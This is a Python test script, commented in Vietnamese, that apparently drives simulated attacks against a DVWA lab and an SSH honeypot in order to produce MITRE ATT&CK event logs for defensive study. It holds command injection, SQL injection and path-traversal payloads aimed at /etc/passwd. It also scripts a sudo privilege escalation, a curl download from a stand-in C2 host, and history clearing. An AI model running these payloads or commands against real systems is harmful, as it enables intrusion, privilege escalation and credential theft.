#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
ADAPTIVE HONEYPOT & DECEPTION LAB - MULTI-SURFACE SIMULATION & TEST SUITE
=============================================================================
Công cụ kiểm thử và tạo dữ liệu mô phỏng cho Lab An toàn Thông tin:
  - Hướng 1: Mô phỏng tương tác Web DVWA (Port 80) qua HTTP requests.
  - Hướng 2: Mô phỏng tương tác SSH Terminal (Port 2222) qua Paramiko.
  - Tự động kiểm tra và xác thực dữ liệu nhật ký MITRE ATT&CK sinh ra.
"""

import sys
import io
import time
import json
import urllib.request
import urllib.parse
from http.cookiejar import CookieJar
from pathlib import Path

# Đảm bảo UTF-8 cho Windows console
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")

import paramiko

# Cấu hình địa chỉ Lab
TARGET_HOST = "192.168.101.218"
WEB_PORT = 80
SSH_PORT = 2222

WEB_BASE_URL = f"http://{TARGET_HOST}:{WEB_PORT}"
SSH_USER = "root"
SSH_PASS_VALID = "supersecretpassword123"
SSH_PASS_INVALID = "wrong_test_pass_999"

# ==============================================================================
# HƯỚNG 1: MÔ PHỎNG KIỂM THỬ ỨNG DỤNG WEB (DVWA PORT 80)
# ==============================================================================
class WebLabSimulator:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.cookie_jar = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))

    def run_all_tests(self):
        print("\n" + "=" * 80)
        print(f"🌐 [HƯỚNG 1: WEB LAB] BẮT ĐẦU KIỂM THỬ TƯƠNG TÁC HTTP TRÊN {self.base_url}")
        print("=" * 80)

        # 1. Khảo sát cổng dịch vụ Web
        self._test_reconnaissance()

        # 2. Đăng nhập và thiết lập mức bảo mật Low
        self._login_and_setup()

        # 3. Mô phỏng kiểm thử Command Injection
        self._test_command_injection()

        # 4. Mô phỏng kiểm thử SQL Injection
        self._test_sql_injection()

        # 5. Mô phỏng kiểm thử File Inclusion (LFI)
        self._test_file_inclusion()

        print("[+] Hoàn tất kiểm thử Hướng 1 (Web DVWA).")

    def _test_reconnaissance(self):
        print("\n[*] 1.1. Khảo sát dịch vụ HTTP (Reconnaissance - T1046)...")
        try:
            req = urllib.request.Request(f"{self.base_url}/login.php", headers={"User-Agent": "Security-Lab-Auditor/1.0"})
            resp = self.opener.open(req, timeout=5)
            print(f"  • Phản hồi HTTP Status: {resp.status} OK")
        except Exception as e:
            print(f"  [!] Lỗi kết nối HTTP: {e}")

    def _login_and_setup(self):
        print("\n[*] 1.2. Xác thực tài khoản kiểm thử và lấy Session Cookie...")
        try:
            # Lấy token ban đầu
            resp = self.opener.open(f"{self.base_url}/login.php", timeout=5)
            html = resp.read().decode("utf-8", errors="ignore")
            
            token = ""
            for line in html.splitlines():
                if "user_token" in line and "value=" in line:
                    parts = line.split("value='")
                    if len(parts) > 1:
                        token = parts[1].split("'")[0]
                    break

            # Gửi thông tin đăng nhập
            login_data = urllib.parse.urlencode({
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token
            }).encode("utf-8")

            req = urllib.request.Request(f"{self.base_url}/login.php", data=login_data, headers={"User-Agent": "Security-Lab-Auditor/1.0"})
            login_resp = self.opener.open(req, timeout=5)
            print(f"  • Đăng nhập Web: Thành công (HTTP {login_resp.status})")

            # Cài đặt Security Low
            sec_data = urllib.parse.urlencode({
                "security": "low",
                "seclev_submit": "Submit"
            }).encode("utf-8")
            self.opener.open(urllib.request.Request(f"{self.base_url}/security.php", data=sec_data), timeout=5)
            print("  • Cấu hình môi trường bảo mật DVWA: Mức Low")
        except Exception as e:
            print(f"  [!] Cảnh báo trong quá trình đăng nhập DVWA: {e}")

    def _test_command_injection(self):
        print("\n[*] 1.3. Mô phỏng kiểm thử Command Injection (MITRE T1059.004)...")
        test_payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1; uname -a",
            "127.0.0.1; cat /etc/passwd"
        ]
        for p in test_payloads:
            encoded_p = urllib.parse.quote_plus(p)
            target_url = f"{self.base_url}/vulnerabilities/exec/?ip={encoded_p}&Submit=Submit"
            try:
                t0 = time.time()
                resp = self.opener.open(target_url, timeout=5)
                lat = round((time.time() - t0) * 1000, 2)
                print(f"  • Gửi request: [{p}] -> HTTP {resp.status} ({lat}ms)")
            except Exception as e:
                print(f"  [!] Lỗi gửi request: {e}")
            time.sleep(0.3)

    def _test_sql_injection(self):
        print("\n[*] 1.4. Mô phỏng kiểm thử SQL Injection (MITRE T1190)...")
        test_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT user, password FROM users #"
        ]
        for p in test_payloads:
            encoded_p = urllib.parse.quote_plus(p)
            target_url = f"{self.base_url}/vulnerabilities/sqli/?id={encoded_p}&Submit=Submit"
            try:
                t0 = time.time()
                resp = self.opener.open(target_url, timeout=5)
                lat = round((time.time() - t0) * 1000, 2)
                print(f"  • Gửi request: [{p}] -> HTTP {resp.status} ({lat}ms)")
            except Exception as e:
                print(f"  [!] Lỗi gửi request: {e}")
            time.sleep(0.3)

    def _test_file_inclusion(self):
        print("\n[*] 1.5. Mô phỏng kiểm thử Local File Inclusion (MITRE T1552.001)...")
        target_url = f"{self.base_url}/vulnerabilities/fi/?page=../../../../etc/passwd"
        try:
            t0 = time.time()
            resp = self.opener.open(target_url, timeout=5)
            lat = round((time.time() - t0) * 1000, 2)
            print(f"  • Gửi request: [page=../../../../etc/passwd] -> HTTP {resp.status} ({lat}ms)")
        except Exception as e:
            print(f"  [!] Lỗi gửi request: {e}")

# ==============================================================================
# HƯỚNG 2: MÔ PHỎNG KIỂM THỬ DÒNG LỆNH SSH (HONEYPOT PORT 2222)
# ==============================================================================
class SSHLabSimulator:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port

    def run_all_tests(self):
        print("\n" + "=" * 80)
        print(f"💻 [HƯỚNG 2: SSH LAB] BẮT ĐẦU KIỂM THỬ TƯƠNG TÁC SHELL TRÊN {self.host}:{self.port}")
        print("=" * 80)

        # 1. Mô phỏng dò mật khẩu sai (Brute Force Detection)
        self._test_auth_failure()

        # 2. Mô phỏng phiên tương tác dòng lệnh và leo thang đặc quyền
        self._test_interactive_session()

        print("[+] Hoàn tất kiểm thử Hướng 2 (SSH Honeypot).")

    def _test_auth_failure(self):
        print("\n[*] 2.1. Mô phỏng nỗ lực dò sai mật khẩu (MITRE T1110)...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.host, port=self.port, username=SSH_USER, password=SSH_PASS_INVALID, timeout=5)
            print("  [!] Cảnh báo: Sai pass nhưng server vẫn cho vào!")
            client.close()
        except paramiko.AuthenticationException:
            print("  • Server từ chối xác thực thành công: Ghi nhận sự kiện dò mật khẩu (Auth_Failed).")
        except Exception as e:
            print(f"  [!] Lỗi kết nối: {e}")

    def _test_interactive_session(self):
        print("\n[*] 2.2. Đăng nhập thành công và thực thi chuỗi lệnh điều tra...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.host, port=self.port, username=SSH_USER, password=SSH_PASS_VALID, timeout=5)
            print("  • Đăng nhập thành công: Cấp quyền vào phiên ảo Stateful VFS.")

            channel = client.invoke_shell()
            time.sleep(0.5)
            banner = channel.recv(2048).decode("utf-8", errors="ignore")
            print(f"  • Nhận Banner giả lập thành công ({len(banner)} bytes).")

            test_commands = [
                ("whoami", "T1033 - System Owner/User Discovery"),
                ("uname -a", "T1082 - System Information Discovery"),
                ("pwd", "T1083 - File and Directory Discovery"),
                ("sudo -l", "T1548.003 - Abuse Elevation Control: Sudo Caching"),
                ("sudo find . -exec /bin/sh \\; -quit", "T1548.003 - GTFOBins Privilege Escalation"),
                ("whoami", "T1033 - Kiểm tra quyền root sau khi leo thang"),
                ("curl -O http://attacker-c2.lab/bot.sh", "T1105 - Ingress Tool Transfer (C2 Download)"),
                ("history -c", "T1070.003 - Clear History (Defense Evasion)"),
                ("exit", "T1059.004 - Normal Terminal Exit")
            ]

            for cmd, desc in test_commands:
                print(f"\n  >>> Thực thi lệnh: {cmd} [{desc}]")
                channel.send(cmd + "\r")
                time.sleep(0.4)
                
                output = ""
                while channel.recv_ready():
                    output += channel.recv(4096).decode("utf-8", errors="ignore")
                
                # In dòng kết quả đầu tiên của phản hồi
                lines = [l.strip() for l in output.splitlines() if l.strip() and cmd not in l]
                sample_res = lines[0] if lines else "(Prompt ready)"
                print(f"  <<< Phản hồi Honeypot: {sample_res[:80]}")

            client.close()
            print("\n  • Đã kết thúc và đóng phiên SSH an toàn.")
        except Exception as e:
            print(f"  [!] Lỗi trong phiên SSH: {e}")

# ==============================================================================
# HÀM CHÍNH ĐIỀU PHỐI KIỂM THỬ LAB
# ==============================================================================
def main():
    print("=" * 80)
    print("🛡️ [DECEPTION LAB] CHƯƠNG TRÌNH KIỂM THỬ & MÔ PHỎNG TẤN CÔNG ĐA BỀ MẶT")
    print(f"🎯 Mục tiêu Lab: {TARGET_HOST} | Web Port: {WEB_PORT} | SSH Port: {SSH_PORT}")
    print("=" * 80)

    # 1. Chạy mô phỏng Web DVWA
    web_sim = WebLabSimulator(WEB_BASE_URL)
    web_sim.run_all_tests()

    # 2. Chạy mô phỏng SSH Honeypot
    ssh_sim = SSHLabSimulator(TARGET_HOST, SSH_PORT)
    ssh_sim.run_all_tests()

    print("\n" + "=" * 80)
    print("🎉 TẤT CẢ CÁC BƯỚC MÔ PHỎNG LAB ĐÃ HOÀN TẤT THÀNH CÔNG!")
    print(f"📊 Để xem log sự kiện thời gian thực đã thu thập, bạn có thể kiểm tra:")
    print(f"  • Trên máy ảo: cat /home/nhuthang/adaptive-honeypot/logs/events.jsonl")
    print(f"  • Hoặc xem phiên: cat /home/nhuthang/adaptive-honeypot/logs/sessions.json")
    print("=" * 80)

if __name__ == "__main__":
    main()
